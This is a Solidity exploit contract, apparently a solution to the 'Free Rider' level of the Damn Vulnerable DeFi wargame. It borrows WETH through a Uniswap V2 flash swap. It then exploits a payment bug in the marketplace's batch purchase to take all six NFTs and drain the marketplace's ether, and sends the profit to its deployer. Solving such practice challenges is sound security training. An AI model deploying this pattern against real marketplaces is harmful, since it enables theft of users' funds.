import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";
contract AttackFreeRider is IUniswapV2Callee,IERC721Receiver{

    using Address for address;
    address payable immutable weth;
    address dvt;
    address factory;
    address payable buyerMaketplace;
    address buyer;
    address nft;
    address owner;
    constructor(
        address payable _weth,
        address _dvt,
        address _factory,
        address payable _buyerMaketplace,
        address _buyer,
        address _nft
    ){
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        buyerMaketplace = _buyerMaketplace;
        buyer = _buyer;
        nft = _nft;
        owner = msg.sender;
    }
    function flash_swap(address tokenBorrow,uint256 amount) external{
        address pair = IUniswapV2Factory(factory).getPair(tokenBorrow,dvt);
        require(pair != address(0),"not pair");
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0out = token0==tokenBorrow ? amount:0;
        uint256 amount1out = token1==tokenBorrow ? amount:0;
        bytes memory data = abi.encode(tokenBorrow,amount);
        IUniswapV2Pair(pair).swap(amount0out,amount1out,address(this),data);

    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    )external override{
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        (address tokenBorrow, uint256 amount) = abi.decode(data,(address,uint256));
        address pair = IUniswapV2Factory(factory).getPair(tokenBorrow, dvt);
        require(pair == msg.sender,"!pair");
        require(sender == address(this),"not self");
        uint256 fee = ((amount*3)/997)+1;
        uint256 amountRe = amount+fee;
        uint256 currBal = IERC20(weth).balanceOf(address(this));
        require(currBal == amount,"borrow failed");
        tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i =0;i<6;i++){
            tokenIds[i] =i;
        }
        FreeRiderNFTMarketplace(buyerMaketplace).buyMany{value:15 ether}(tokenIds);
        uint256 []memory tokenidsSell = new uint256[](2);
        uint256[] memory ethervalue= new uint256[](2);
        for (uint256 i =0 ;i<2;i++){
            tokenidsSell[i] =i;
            ethervalue[i] = 15 ether;
        }

        DamnValuableNFT(nft).setApprovalForAll(buyerMaketplace,true);
        FreeRiderNFTMarketplace(buyerMaketplace).offerMany(tokenidsSell, ethervalue);
        FreeRiderNFTMarketplace(buyerMaketplace).buyMany{value: 15 ether}(
            tokenidsSell
        );
        
        for(uint256 i =0;i<6;i++){
            DamnValuableNFT(nft).safeTransferFrom(address(this),buyer,i);
        }
        (bool success,) = weth.call{value: 15.1 ether}("");
        require(success,"error swap weth");
        IERC20(tokenBorrow).transfer(pair,amountRe);
        payable(owner).transfer(address(this).balance);



    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive () external payable {}


}